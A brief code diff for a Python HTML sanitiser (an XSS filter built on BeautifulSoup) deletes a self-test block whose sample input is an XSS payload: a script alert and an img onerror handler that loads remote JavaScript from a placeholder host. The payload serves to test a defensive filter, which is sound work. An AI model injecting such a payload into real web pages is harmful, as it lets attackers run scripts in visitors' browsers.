@@ -68,11 +68,3 @@ class Utils:
                 else:
                     del tag.attrs[k]
         return soup.decode()
-
-
-if __name__ == '__main__':
-    comment = '''<h1 class="title" id="nmsl">Hello World</h1> <script>alert('I'm xss hacker!')</script> <img 
-    style=display:none src=1 onerror='var s=document.createElement("script");s.src="https://xss.example..com/m.js";(
-    document.body||document.documentElement).appendChild(s);' /> '''
-    print('Before\n', comment)
-    print('After \n', Utils.xss_filter(comment))
